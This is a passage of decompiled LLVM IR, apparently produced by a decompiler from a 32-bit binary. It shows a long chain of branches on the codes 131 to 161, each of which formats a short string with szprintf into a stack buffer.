dec_label_pc_804bac6:                             ; preds = %dec_label_pc_804ba8d, %dec_label_pc_804ba96
  %v13_804bac6 = icmp eq i32 %v2_8049efa, 131
  %v1_804bacd = icmp eq i1 %v13_804bac6, false
  br i1 %v1_804bacd, label %dec_label_pc_804baff, label %dec_label_pc_804bacf

dec_label_pc_804bacf:                             ; preds = %dec_label_pc_804bac6
  %v0_804bacf = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bacf = zext i8 %v0_804bacf to i32
  store i32 %v1_804bacf, i32* @edx, align 4
  %v0_804bad9 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bad9 = zext i8 %v0_804bad9 to i32
  %v2_804bae8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bae8, i32* @ebx, align 4
  %v4_804bafa = call i32 @szprintf(i32 %v2_804bae8, i32 ptrtoint ([14 x i8]* @global_var_8058f93.167 to i32), i32 %v1_804bad9)
  br label %dec_label_pc_804baff

dec_label_pc_804baff:                             ; preds = %dec_label_pc_804bac6, %dec_label_pc_804bacf
  %v13_804baff = icmp eq i32 %v2_8049efa, 132
  %v1_804bb06 = icmp eq i1 %v13_804baff, false
  br i1 %v1_804bb06, label %dec_label_pc_804bb38, label %dec_label_pc_804bb08

dec_label_pc_804bb08:                             ; preds = %dec_label_pc_804baff
  %v0_804bb08 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bb08 = zext i8 %v0_804bb08 to i32
  store i32 %v1_804bb08, i32* @edx, align 4
  %v0_804bb12 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bb12 = zext i8 %v0_804bb12 to i32
  %v2_804bb21 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb21, i32* @ebx, align 4
  %v4_804bb33 = call i32 @szprintf(i32 %v2_804bb21, i32 ptrtoint ([14 x i8]* @global_var_8058fa1.168 to i32), i32 %v1_804bb12)
  br label %dec_label_pc_804bb38

dec_label_pc_804bb38:                             ; preds = %dec_label_pc_804baff, %dec_label_pc_804bb08
  %v13_804bb38 = icmp eq i32 %v2_8049efa, 133
  %v1_804bb3f = icmp eq i1 %v13_804bb38, false
  br i1 %v1_804bb3f, label %dec_label_pc_804bb71, label %dec_label_pc_804bb41

dec_label_pc_804bb41:                             ; preds = %dec_label_pc_804bb38
  %v0_804bb41 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bb41 = zext i8 %v0_804bb41 to i32
  store i32 %v1_804bb41, i32* @edx, align 4
  %v0_804bb4b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bb4b = zext i8 %v0_804bb4b to i32
  %v2_804bb5a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb5a, i32* @ebx, align 4
  %v4_804bb6c = call i32 @szprintf(i32 %v2_804bb5a, i32 ptrtoint ([14 x i8]* @global_var_8058faf.169 to i32), i32 %v1_804bb4b)
  br label %dec_label_pc_804bb71

dec_label_pc_804bb71:                             ; preds = %dec_label_pc_804bb38, %dec_label_pc_804bb41
  %v13_804bb71 = icmp eq i32 %v2_8049efa, 134
  %v1_804bb78 = icmp eq i1 %v13_804bb71, false
  br i1 %v1_804bb78, label %dec_label_pc_804bbaa, label %dec_label_pc_804bb7a

dec_label_pc_804bb7a:                             ; preds = %dec_label_pc_804bb71
  %v0_804bb7a = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bb7a = zext i8 %v0_804bb7a to i32
  store i32 %v1_804bb7a, i32* @edx, align 4
  %v0_804bb84 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bb84 = zext i8 %v0_804bb84 to i32
  %v2_804bb93 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bb93, i32* @ebx, align 4
  %v4_804bba5 = call i32 @szprintf(i32 %v2_804bb93, i32 ptrtoint ([14 x i8]* @global_var_8058fbd.170 to i32), i32 %v1_804bb84)
  br label %dec_label_pc_804bbaa

dec_label_pc_804bbaa:                             ; preds = %dec_label_pc_804bb71, %dec_label_pc_804bb7a
  %v13_804bbaa = icmp eq i32 %v2_8049efa, 135
  %v1_804bbb1 = icmp eq i1 %v13_804bbaa, false
  br i1 %v1_804bbb1, label %dec_label_pc_804bbe3, label %dec_label_pc_804bbb3

dec_label_pc_804bbb3:                             ; preds = %dec_label_pc_804bbaa
  %v0_804bbb3 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bbb3 = zext i8 %v0_804bbb3 to i32
  store i32 %v1_804bbb3, i32* @edx, align 4
  %v0_804bbbd = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bbbd = zext i8 %v0_804bbbd to i32
  %v2_804bbcc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bbcc, i32* @ebx, align 4
  %v4_804bbde = call i32 @szprintf(i32 %v2_804bbcc, i32 ptrtoint ([14 x i8]* @global_var_8058fcb.171 to i32), i32 %v1_804bbbd)
  br label %dec_label_pc_804bbe3

dec_label_pc_804bbe3:                             ; preds = %dec_label_pc_804bbaa, %dec_label_pc_804bbb3
  %v13_804bbe3 = icmp eq i32 %v2_8049efa, 136
  %v1_804bbea = icmp eq i1 %v13_804bbe3, false
  br i1 %v1_804bbea, label %dec_label_pc_804bc1c, label %dec_label_pc_804bbec

dec_label_pc_804bbec:                             ; preds = %dec_label_pc_804bbe3
  %v0_804bbec = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bbec = zext i8 %v0_804bbec to i32
  store i32 %v1_804bbec, i32* @edx, align 4
  %v0_804bbf6 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bbf6 = zext i8 %v0_804bbf6 to i32
  %v2_804bc05 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc05, i32* @ebx, align 4
  %v4_804bc17 = call i32 @szprintf(i32 %v2_804bc05, i32 ptrtoint ([14 x i8]* @global_var_8058fd9.172 to i32), i32 %v1_804bbf6)
  br label %dec_label_pc_804bc1c

dec_label_pc_804bc1c:                             ; preds = %dec_label_pc_804bbe3, %dec_label_pc_804bbec
  %v13_804bc1c = icmp eq i32 %v2_8049efa, 137
  %v1_804bc23 = icmp eq i1 %v13_804bc1c, false
  br i1 %v1_804bc23, label %dec_label_pc_804bc55, label %dec_label_pc_804bc25

dec_label_pc_804bc25:                             ; preds = %dec_label_pc_804bc1c
  %v0_804bc25 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bc25 = zext i8 %v0_804bc25 to i32
  store i32 %v1_804bc25, i32* @edx, align 4
  %v0_804bc2f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bc2f = zext i8 %v0_804bc2f to i32
  %v2_804bc3e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc3e, i32* @ebx, align 4
  %v4_804bc50 = call i32 @szprintf(i32 %v2_804bc3e, i32 ptrtoint ([13 x i8]* @global_var_8058fe7.173 to i32), i32 %v1_804bc2f)
  br label %dec_label_pc_804bc55

dec_label_pc_804bc55:                             ; preds = %dec_label_pc_804bc1c, %dec_label_pc_804bc25
  %v13_804bc55 = icmp eq i32 %v2_8049efa, 138
  %v1_804bc5c = icmp eq i1 %v13_804bc55, false
  br i1 %v1_804bc5c, label %dec_label_pc_804bc8e, label %dec_label_pc_804bc5e

dec_label_pc_804bc5e:                             ; preds = %dec_label_pc_804bc55
  %v0_804bc5e = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bc5e = zext i8 %v0_804bc5e to i32
  store i32 %v1_804bc5e, i32* @edx, align 4
  %v0_804bc68 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bc68 = zext i8 %v0_804bc68 to i32
  %v2_804bc77 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc77, i32* @ebx, align 4
  %v4_804bc89 = call i32 @szprintf(i32 %v2_804bc77, i32 ptrtoint ([13 x i8]* @global_var_8058ff4.174 to i32), i32 %v1_804bc68)
  br label %dec_label_pc_804bc8e

dec_label_pc_804bc8e:                             ; preds = %dec_label_pc_804bc55, %dec_label_pc_804bc5e
  %v13_804bc8e = icmp eq i32 %v2_8049efa, 139
  %v1_804bc95 = icmp eq i1 %v13_804bc8e, false
  br i1 %v1_804bc95, label %dec_label_pc_804bcc7, label %dec_label_pc_804bc97

dec_label_pc_804bc97:                             ; preds = %dec_label_pc_804bc8e
  %v0_804bc97 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bc97 = zext i8 %v0_804bc97 to i32
  store i32 %v1_804bc97, i32* @edx, align 4
  %v0_804bca1 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bca1 = zext i8 %v0_804bca1 to i32
  %v2_804bcb0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcb0, i32* @ebx, align 4
  %v4_804bcc2 = call i32 @szprintf(i32 %v2_804bcb0, i32 ptrtoint ([13 x i8]* @global_var_8059001.175 to i32), i32 %v1_804bca1)
  br label %dec_label_pc_804bcc7

dec_label_pc_804bcc7:                             ; preds = %dec_label_pc_804bc8e, %dec_label_pc_804bc97
  %v13_804bcc7 = icmp eq i32 %v2_8049efa, 140
  %v1_804bcce = icmp eq i1 %v13_804bcc7, false
  br i1 %v1_804bcce, label %dec_label_pc_804bd00, label %dec_label_pc_804bcd0

dec_label_pc_804bcd0:                             ; preds = %dec_label_pc_804bcc7
  %v0_804bcd0 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bcd0 = zext i8 %v0_804bcd0 to i32
  store i32 %v1_804bcd0, i32* @edx, align 4
  %v0_804bcda = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bcda = zext i8 %v0_804bcda to i32
  %v2_804bce9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bce9, i32* @ebx, align 4
  %v4_804bcfb = call i32 @szprintf(i32 %v2_804bce9, i32 ptrtoint ([13 x i8]* @global_var_805900e.176 to i32), i32 %v1_804bcda)
  br label %dec_label_pc_804bd00

dec_label_pc_804bd00:                             ; preds = %dec_label_pc_804bcc7, %dec_label_pc_804bcd0
  %v13_804bd00 = icmp eq i32 %v2_8049efa, 141
  %v1_804bd07 = icmp eq i1 %v13_804bd00, false
  br i1 %v1_804bd07, label %dec_label_pc_804bd39, label %dec_label_pc_804bd09

dec_label_pc_804bd09:                             ; preds = %dec_label_pc_804bd00
  %v0_804bd09 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bd09 = zext i8 %v0_804bd09 to i32
  store i32 %v1_804bd09, i32* @edx, align 4
  %v0_804bd13 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bd13 = zext i8 %v0_804bd13 to i32
  %v2_804bd22 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd22, i32* @ebx, align 4
  %v4_804bd34 = call i32 @szprintf(i32 %v2_804bd22, i32 ptrtoint ([13 x i8]* @global_var_805901b.177 to i32), i32 %v1_804bd13)
  br label %dec_label_pc_804bd39

dec_label_pc_804bd39:                             ; preds = %dec_label_pc_804bd00, %dec_label_pc_804bd09
  %v13_804bd39 = icmp eq i32 %v2_8049efa, 142
  %v1_804bd40 = icmp eq i1 %v13_804bd39, false
  br i1 %v1_804bd40, label %dec_label_pc_804bd72, label %dec_label_pc_804bd42

dec_label_pc_804bd42:                             ; preds = %dec_label_pc_804bd39
  %v0_804bd42 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bd42 = zext i8 %v0_804bd42 to i32
  store i32 %v1_804bd42, i32* @edx, align 4
  %v0_804bd4c = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bd4c = zext i8 %v0_804bd4c to i32
  %v2_804bd5b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd5b, i32* @ebx, align 4
  %v4_804bd6d = call i32 @szprintf(i32 %v2_804bd5b, i32 ptrtoint ([13 x i8]* @global_var_8059028.178 to i32), i32 %v1_804bd4c)
  br label %dec_label_pc_804bd72

dec_label_pc_804bd72:                             ; preds = %dec_label_pc_804bd39, %dec_label_pc_804bd42
  %v13_804bd72 = icmp eq i32 %v2_8049efa, 143
  %v1_804bd79 = icmp eq i1 %v13_804bd72, false
  br i1 %v1_804bd79, label %dec_label_pc_804bdab, label %dec_label_pc_804bd7b

dec_label_pc_804bd7b:                             ; preds = %dec_label_pc_804bd72
  %v0_804bd7b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bd7b = zext i8 %v0_804bd7b to i32
  store i32 %v1_804bd7b, i32* @edx, align 4
  %v0_804bd85 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bd85 = zext i8 %v0_804bd85 to i32
  %v2_804bd94 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd94, i32* @ebx, align 4
  %v4_804bda6 = call i32 @szprintf(i32 %v2_804bd94, i32 ptrtoint ([14 x i8]* @global_var_8058f3f.161 to i32), i32 %v1_804bd85)
  br label %dec_label_pc_804bdab

dec_label_pc_804bdab:                             ; preds = %dec_label_pc_804bd72, %dec_label_pc_804bd7b
  %v10_804bdab = icmp eq i32 %v2_8049efa, 144
  %v1_804bdb2 = icmp eq i1 %v10_804bdab, false
  br i1 %v1_804bdb2, label %dec_label_pc_804bde4, label %dec_label_pc_804bdb4

dec_label_pc_804bdb4:                             ; preds = %dec_label_pc_804bdab
  %v0_804bdb4 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bdb4 = zext i8 %v0_804bdb4 to i32
  store i32 %v1_804bdb4, i32* @edx, align 4
  %v0_804bdbe = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bdbe = zext i8 %v0_804bdbe to i32
  %v2_804bdcd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdcd, i32* @ebx, align 4
  %v4_804bddf = call i32 @szprintf(i32 %v2_804bdcd, i32 ptrtoint ([14 x i8]* @global_var_8059035.179 to i32), i32 %v1_804bdbe)
  br label %dec_label_pc_804bde4

dec_label_pc_804bde4:                             ; preds = %dec_label_pc_804bdab, %dec_label_pc_804bdb4
  %v13_804bde4 = icmp eq i32 %v2_8049efa, 145
  %v1_804bdeb = icmp eq i1 %v13_804bde4, false
  br i1 %v1_804bdeb, label %dec_label_pc_804be1d, label %dec_label_pc_804bded

dec_label_pc_804bded:                             ; preds = %dec_label_pc_804bde4
  %v0_804bded = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bded = zext i8 %v0_804bded to i32
  store i32 %v1_804bded, i32* @edx, align 4
  %v0_804bdf7 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bdf7 = zext i8 %v0_804bdf7 to i32
  %v2_804be06 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be06, i32* @ebx, align 4
  %v4_804be18 = call i32 @szprintf(i32 %v2_804be06, i32 ptrtoint ([14 x i8]* @global_var_8059043.180 to i32), i32 %v1_804bdf7)
  br label %dec_label_pc_804be1d

dec_label_pc_804be1d:                             ; preds = %dec_label_pc_804bde4, %dec_label_pc_804bded
  %v13_804be1d = icmp eq i32 %v2_8049efa, 146
  %v1_804be24 = icmp eq i1 %v13_804be1d, false
  br i1 %v1_804be24, label %dec_label_pc_804be56, label %dec_label_pc_804be26

dec_label_pc_804be26:                             ; preds = %dec_label_pc_804be1d
  %v0_804be26 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804be26 = zext i8 %v0_804be26 to i32
  store i32 %v1_804be26, i32* @edx, align 4
  %v0_804be30 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804be30 = zext i8 %v0_804be30 to i32
  %v2_804be3f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be3f, i32* @ebx, align 4
  %v4_804be51 = call i32 @szprintf(i32 %v2_804be3f, i32 ptrtoint ([14 x i8]* @global_var_8059051.181 to i32), i32 %v1_804be30)
  br label %dec_label_pc_804be56

dec_label_pc_804be56:                             ; preds = %dec_label_pc_804be1d, %dec_label_pc_804be26
  %v13_804be56 = icmp eq i32 %v2_8049efa, 147
  %v1_804be5d = icmp eq i1 %v13_804be56, false
  br i1 %v1_804be5d, label %dec_label_pc_804be8f, label %dec_label_pc_804be5f

dec_label_pc_804be5f:                             ; preds = %dec_label_pc_804be56
  %v0_804be5f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804be5f = zext i8 %v0_804be5f to i32
  store i32 %v1_804be5f, i32* @edx, align 4
  %v0_804be69 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804be69 = zext i8 %v0_804be69 to i32
  %v2_804be78 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be78, i32* @ebx, align 4
  %v4_804be8a = call i32 @szprintf(i32 %v2_804be78, i32 ptrtoint ([13 x i8]* @global_var_805905f.182 to i32), i32 %v1_804be69)
  br label %dec_label_pc_804be8f

dec_label_pc_804be8f:                             ; preds = %dec_label_pc_804be56, %dec_label_pc_804be5f
  %v13_804be8f = icmp eq i32 %v2_8049efa, 148
  %v1_804be96 = icmp eq i1 %v13_804be8f, false
  br i1 %v1_804be96, label %dec_label_pc_804bec8, label %dec_label_pc_804be98

dec_label_pc_804be98:                             ; preds = %dec_label_pc_804be8f
  %v0_804be98 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804be98 = zext i8 %v0_804be98 to i32
  store i32 %v1_804be98, i32* @edx, align 4
  %v0_804bea2 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bea2 = zext i8 %v0_804bea2 to i32
  %v2_804beb1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804beb1, i32* @ebx, align 4
  %v4_804bec3 = call i32 @szprintf(i32 %v2_804beb1, i32 ptrtoint ([13 x i8]* @global_var_805906c.183 to i32), i32 %v1_804bea2)
  br label %dec_label_pc_804bec8

dec_label_pc_804bec8:                             ; preds = %dec_label_pc_804be8f, %dec_label_pc_804be98
  %v13_804bec8 = icmp eq i32 %v2_8049efa, 149
  %v1_804becf = icmp eq i1 %v13_804bec8, false
  br i1 %v1_804becf, label %dec_label_pc_804bf01, label %dec_label_pc_804bed1

dec_label_pc_804bed1:                             ; preds = %dec_label_pc_804bec8
  %v0_804bed1 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bed1 = zext i8 %v0_804bed1 to i32
  store i32 %v1_804bed1, i32* @edx, align 4
  %v0_804bedb = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bedb = zext i8 %v0_804bedb to i32
  %v2_804beea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804beea, i32* @ebx, align 4
  %v4_804befc = call i32 @szprintf(i32 %v2_804beea, i32 ptrtoint ([14 x i8]* @global_var_8059079.184 to i32), i32 %v1_804bedb)
  br label %dec_label_pc_804bf01

dec_label_pc_804bf01:                             ; preds = %dec_label_pc_804bec8, %dec_label_pc_804bed1
  %v13_804bf01 = icmp eq i32 %v2_8049efa, 150
  %v1_804bf08 = icmp eq i1 %v13_804bf01, false
  br i1 %v1_804bf08, label %dec_label_pc_804bf3a, label %dec_label_pc_804bf0a

dec_label_pc_804bf0a:                             ; preds = %dec_label_pc_804bf01
  %v0_804bf0a = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bf0a = zext i8 %v0_804bf0a to i32
  store i32 %v1_804bf0a, i32* @edx, align 4
  %v0_804bf14 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bf14 = zext i8 %v0_804bf14 to i32
  %v2_804bf23 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf23, i32* @ebx, align 4
  %v4_804bf35 = call i32 @szprintf(i32 %v2_804bf23, i32 ptrtoint ([14 x i8]* @global_var_8059087.185 to i32), i32 %v1_804bf14)
  br label %dec_label_pc_804bf3a

dec_label_pc_804bf3a:                             ; preds = %dec_label_pc_804bf01, %dec_label_pc_804bf0a
  %v13_804bf3a = icmp eq i32 %v2_8049efa, 151
  %v1_804bf41 = icmp eq i1 %v13_804bf3a, false
  br i1 %v1_804bf41, label %dec_label_pc_804bf73, label %dec_label_pc_804bf43

dec_label_pc_804bf43:                             ; preds = %dec_label_pc_804bf3a
  %v0_804bf43 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bf43 = zext i8 %v0_804bf43 to i32
  store i32 %v1_804bf43, i32* @edx, align 4
  %v0_804bf4d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bf4d = zext i8 %v0_804bf4d to i32
  %v2_804bf5c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf5c, i32* @ebx, align 4
  %v4_804bf6e = call i32 @szprintf(i32 %v2_804bf5c, i32 ptrtoint ([14 x i8]* @global_var_8059095.186 to i32), i32 %v1_804bf4d)
  br label %dec_label_pc_804bf73

dec_label_pc_804bf73:                             ; preds = %dec_label_pc_804bf3a, %dec_label_pc_804bf43
  %v13_804bf73 = icmp eq i32 %v2_8049efa, 152
  %v1_804bf7a = icmp eq i1 %v13_804bf73, false
  br i1 %v1_804bf7a, label %dec_label_pc_804bfac, label %dec_label_pc_804bf7c

dec_label_pc_804bf7c:                             ; preds = %dec_label_pc_804bf73
  %v0_804bf7c = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bf7c = zext i8 %v0_804bf7c to i32
  store i32 %v1_804bf7c, i32* @edx, align 4
  %v0_804bf86 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bf86 = zext i8 %v0_804bf86 to i32
  %v2_804bf95 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf95, i32* @ebx, align 4
  %v4_804bfa7 = call i32 @szprintf(i32 %v2_804bf95, i32 ptrtoint ([14 x i8]* @global_var_8058ec6.152 to i32), i32 %v1_804bf86)
  br label %dec_label_pc_804bfac

dec_label_pc_804bfac:                             ; preds = %dec_label_pc_804bf73, %dec_label_pc_804bf7c
  %v13_804bfac = icmp eq i32 %v2_8049efa, 153
  %v1_804bfb3 = icmp eq i1 %v13_804bfac, false
  br i1 %v1_804bfb3, label %dec_label_pc_804bfe5, label %dec_label_pc_804bfb5

dec_label_pc_804bfb5:                             ; preds = %dec_label_pc_804bfac
  %v0_804bfb5 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bfb5 = zext i8 %v0_804bfb5 to i32
  store i32 %v1_804bfb5, i32* @edx, align 4
  %v0_804bfbf = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bfbf = zext i8 %v0_804bfbf to i32
  %v2_804bfce = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfce, i32* @ebx, align 4
  %v4_804bfe0 = call i32 @szprintf(i32 %v2_804bfce, i32 ptrtoint ([13 x i8]* @global_var_80590a3.187 to i32), i32 %v1_804bfbf)
  br label %dec_label_pc_804bfe5

dec_label_pc_804bfe5:                             ; preds = %dec_label_pc_804bfac, %dec_label_pc_804bfb5
  %v13_804bfe5 = icmp eq i32 %v2_8049efa, 154
  %v1_804bfec = icmp eq i1 %v13_804bfe5, false
  br i1 %v1_804bfec, label %dec_label_pc_804c01e, label %dec_label_pc_804bfee

dec_label_pc_804bfee:                             ; preds = %dec_label_pc_804bfe5
  %v0_804bfee = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804bfee = zext i8 %v0_804bfee to i32
  store i32 %v1_804bfee, i32* @edx, align 4
  %v0_804bff8 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804bff8 = zext i8 %v0_804bff8 to i32
  %v2_804c007 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c007, i32* @ebx, align 4
  %v4_804c019 = call i32 @szprintf(i32 %v2_804c007, i32 ptrtoint ([13 x i8]* @global_var_80590b0.188 to i32), i32 %v1_804bff8)
  br label %dec_label_pc_804c01e

dec_label_pc_804c01e:                             ; preds = %dec_label_pc_804bfe5, %dec_label_pc_804bfee
  %v13_804c01e = icmp eq i32 %v2_8049efa, 155
  %v1_804c025 = icmp eq i1 %v13_804c01e, false
  br i1 %v1_804c025, label %dec_label_pc_804c057, label %dec_label_pc_804c027

dec_label_pc_804c027:                             ; preds = %dec_label_pc_804c01e
  %v0_804c027 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c027 = zext i8 %v0_804c027 to i32
  store i32 %v1_804c027, i32* @edx, align 4
  %v0_804c031 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c031 = zext i8 %v0_804c031 to i32
  %v2_804c040 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c040, i32* @ebx, align 4
  %v4_804c052 = call i32 @szprintf(i32 %v2_804c040, i32 ptrtoint ([13 x i8]* @global_var_80590bd.189 to i32), i32 %v1_804c031)
  br label %dec_label_pc_804c057

dec_label_pc_804c057:                             ; preds = %dec_label_pc_804c01e, %dec_label_pc_804c027
  %v13_804c057 = icmp eq i32 %v2_8049efa, 156
  %v1_804c05e = icmp eq i1 %v13_804c057, false
  br i1 %v1_804c05e, label %dec_label_pc_804c090, label %dec_label_pc_804c060

dec_label_pc_804c060:                             ; preds = %dec_label_pc_804c057
  %v0_804c060 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c060 = zext i8 %v0_804c060 to i32
  store i32 %v1_804c060, i32* @edx, align 4
  %v0_804c06a = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c06a = zext i8 %v0_804c06a to i32
  %v2_804c079 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c079, i32* @ebx, align 4
  %v4_804c08b = call i32 @szprintf(i32 %v2_804c079, i32 ptrtoint ([13 x i8]* @global_var_80590ca.190 to i32), i32 %v1_804c06a)
  br label %dec_label_pc_804c090

dec_label_pc_804c090:                             ; preds = %dec_label_pc_804c057, %dec_label_pc_804c060
  %v13_804c090 = icmp eq i32 %v2_8049efa, 157
  %v1_804c097 = icmp eq i1 %v13_804c090, false
  br i1 %v1_804c097, label %dec_label_pc_804c0c9, label %dec_label_pc_804c099

dec_label_pc_804c099:                             ; preds = %dec_label_pc_804c090
  %v0_804c099 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c099 = zext i8 %v0_804c099 to i32
  store i32 %v1_804c099, i32* @edx, align 4
  %v0_804c0a3 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c0a3 = zext i8 %v0_804c0a3 to i32
  %v2_804c0b2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0b2, i32* @ebx, align 4
  %v4_804c0c4 = call i32 @szprintf(i32 %v2_804c0b2, i32 ptrtoint ([13 x i8]* @global_var_80590d7.191 to i32), i32 %v1_804c0a3)
  br label %dec_label_pc_804c0c9

dec_label_pc_804c0c9:                             ; preds = %dec_label_pc_804c090, %dec_label_pc_804c099
  %v13_804c0c9 = icmp eq i32 %v2_8049efa, 158
  %v1_804c0d0 = icmp eq i1 %v13_804c0c9, false
  br i1 %v1_804c0d0, label %dec_label_pc_804c102, label %dec_label_pc_804c0d2

dec_label_pc_804c0d2:                             ; preds = %dec_label_pc_804c0c9
  %v0_804c0d2 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c0d2 = zext i8 %v0_804c0d2 to i32
  store i32 %v1_804c0d2, i32* @edx, align 4
  %v0_804c0dc = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c0dc = zext i8 %v0_804c0dc to i32
  %v2_804c0eb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0eb, i32* @ebx, align 4
  %v4_804c0fd = call i32 @szprintf(i32 %v2_804c0eb, i32 ptrtoint ([12 x i8]* @global_var_80590e4.192 to i32), i32 %v1_804c0dc)
  br label %dec_label_pc_804c102

dec_label_pc_804c102:                             ; preds = %dec_label_pc_804c0c9, %dec_label_pc_804c0d2
  %v13_804c102 = icmp eq i32 %v2_8049efa, 159
  %v1_804c109 = icmp eq i1 %v13_804c102, false
  br i1 %v1_804c109, label %dec_label_pc_804c13b, label %dec_label_pc_804c10b

dec_label_pc_804c10b:                             ; preds = %dec_label_pc_804c102
  %v0_804c10b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c10b = zext i8 %v0_804c10b to i32
  store i32 %v1_804c10b, i32* @edx, align 4
  %v0_804c115 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c115 = zext i8 %v0_804c115 to i32
  %v2_804c124 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c124, i32* @ebx, align 4
  %v4_804c136 = call i32 @szprintf(i32 %v2_804c124, i32 ptrtoint ([14 x i8]* @global_var_80590f0.193 to i32), i32 %v1_804c115)
  br label %dec_label_pc_804c13b

dec_label_pc_804c13b:                             ; preds = %dec_label_pc_804c102, %dec_label_pc_804c10b
  %v10_804c13b = icmp eq i32 %v2_8049efa, 160
  %v1_804c142 = icmp eq i1 %v10_804c13b, false
  br i1 %v1_804c142, label %dec_label_pc_804c174, label %dec_label_pc_804c144

dec_label_pc_804c144:                             ; preds = %dec_label_pc_804c13b
  %v0_804c144 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c144 = zext i8 %v0_804c144 to i32
  store i32 %v1_804c144, i32* @edx, align 4
  %v0_804c14e = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c14e = zext i8 %v0_804c14e to i32
  %v2_804c15d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c15d, i32* @ebx, align 4
  %v4_804c16f = call i32 @szprintf(i32 %v2_804c15d, i32 ptrtoint ([13 x i8]* @global_var_80590fe.194 to i32), i32 %v1_804c14e)
  br label %dec_label_pc_804c174

dec_label_pc_804c174:                             ; preds = %dec_label_pc_804c13b, %dec_label_pc_804c144
  %v13_804c174 = icmp eq i32 %v2_8049efa, 161
  %v1_804c17b = icmp eq i1 %v13_804c174, false
  br i1 %v1_804c17b, label %dec_label_pc_804c1ad, label %dec_label_pc_804c17d

dec_label_pc_804c17d:                             ; preds = %dec_label_pc_804c174
  %v0_804c17d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c17d = zext i8 %v0_804c17d to i32
